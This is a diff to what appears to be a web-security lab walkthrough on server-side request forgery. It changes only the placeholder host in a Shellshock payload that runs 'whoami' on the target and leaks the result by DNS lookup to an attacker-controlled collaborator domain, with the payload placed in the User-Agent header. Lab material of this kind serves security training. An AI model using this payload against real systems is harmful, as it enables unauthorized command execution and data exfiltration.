@@ -160,7 +160,7 @@ An attacker will need to change the stock check URL to access the admin interfac
 7. Go to the Collaborator tab and generate a unique Burp Collaborator payload. Place this into the following Shellshock payload:
 
 ```text
-() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+() { :; }; /usr/bin/nslookup $(whoami).burp-collab-subdomain
 ```
     
 8. Replace the User-Agent string in the Burp Intruder request with the Shellshock payload containing your Collaborator domain.
